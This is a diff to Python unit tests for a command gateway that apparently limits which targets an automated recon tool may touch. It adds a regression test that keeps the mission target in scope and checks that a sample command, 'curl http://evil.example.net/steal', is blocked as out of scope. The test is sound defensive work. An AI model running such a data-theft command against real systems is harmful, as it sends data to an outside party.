@@ -80,13 +80,25 @@ class CommandGatewayTests(unittest.TestCase):
         self.assertFalse(verdict.allowed)
         self.assertEqual(verdict.rule, "scope")
 
-    def test_policy_from_config_is_permissive_until_scope_enabled(self):
+    def test_policy_from_config_always_includes_mission_target(self):
+        # Regression test (AUDIT_REPORT.md Bug #1): the mission target must be
+        # in scope even when scope enforcement is disabled. An empty allowlist
+        # here makes the fail-closed gateway block EVERY target-bearing
+        # command, so a default-config run could not execute any recon.
         old_enforce = CONFIG.ENFORCE_SCOPE
         old_allowlist = CONFIG.SCOPE_ALLOWLIST
         try:
             CONFIG.ENFORCE_SCOPE = False
-            CONFIG.SCOPE_ALLOWLIST = "example.com"
-            self.assertEqual(policy_from_config("target.local").allowed_targets, set())
+            CONFIG.SCOPE_ALLOWLIST = ""
+            policy = policy_from_config("target.local")
+            self.assertIn("target.local", policy.allowed_targets)
+
+            # Out-of-scope references must still be blocked.
+            verdict = PolicyEngine(policy).evaluate(
+                CommandRequest.from_shell("curl http://evil.example.net/steal", target="target.local")
+            )
+            self.assertFalse(verdict.allowed)
+            self.assertEqual(verdict.rule, "scope")
 
             CONFIG.ENFORCE_SCOPE = True
             CONFIG.SCOPE_ALLOWLIST = "example.com,10.0.0.0/8"
